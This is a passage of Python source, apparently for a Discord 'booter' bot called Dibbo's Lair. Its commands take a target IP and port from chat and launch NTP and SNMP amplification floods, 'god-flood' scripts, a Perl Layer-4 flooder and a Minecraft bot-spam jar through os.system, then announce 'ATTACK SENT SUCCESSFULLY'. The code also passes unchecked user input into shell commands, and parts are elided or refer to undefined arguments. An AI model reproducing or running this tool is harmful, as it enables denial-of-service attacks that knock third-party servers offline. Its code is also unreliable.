...
banner_two = f"""\n   
                                               {red}╔═══════════════════════════════════════╗
                                               {red}║    𝗗𝗜𝗕𝗕𝗢'𝗦 𝗟𝗔𝗜𝗥 - 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧    ║
                                               {white}║          𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗗𝗜𝗕𝗕𝗢           ║
                                               {white}╚═══════════════════════════════════════╝"""
...
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Dibbo's Lair | Prefix: $"))
    
    print(banner_two)
    print(f"                                               {lred}Dibbo's Lair Started.")
    print(f"                                        {lgreen}Author: {lcyan}Dibbo {black}~ {lmagenta}Premium Edition")
...
async def avatar(ctx, *, member: discord.Member = None):
    ...
    embed.set_footer(text=f"𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
...
async def invite(ctx):
    ...
    embed.add_field(name='**Invite link**:', value='Contact Dibbo for exclusive access', inline=True)
    embed.set_footer(text="𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
    await ctx.send(embed=embed)   
...
async def deathbot(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        ...
        def attack():
            os.system(f"java -jar DeathBot.jar -move true -ping true -pingamount 100 -host {arg1} -port {arg2} -threads 10000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 100 -doublej true -protocol 47 -msg 'Attack By SlayyGang' -amount 10 -proxymode NONE -login '/login Test123 ' -register '/register Test123 Test123' -time {arg3} -debug true")
            os.system(f"")
...
async def ntp(ctx, arg1):
    if arg1 == '1.1.1.1':
        ...
        def attack():
            os.system(f'python ntp-py.py {arg1} permaip.txt 1024')
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``NTP``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
...
async def snmp(ctx, arg1):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f'python snmp-py.py {arg1} permaip.txt 1024')
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``SNMP``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
...
async def godflood(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f'python god-flood.py {arg1} {arg2} 65335 {arg3}')
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``GOD FLOOD``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
...
async def godfloodv2(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f'python god-flood-v2.py {arg1} {arg2} 65335')
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``GOD FLOOD V2``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
...
async def l4(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"perl reckz.pl {arg1} {arg2} 65525  {arg3}")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗦𝗜𝗭𝗘]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``Layer 4``', value='**[𝗧𝗜𝗠𝗘]**: ``{arg3} sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
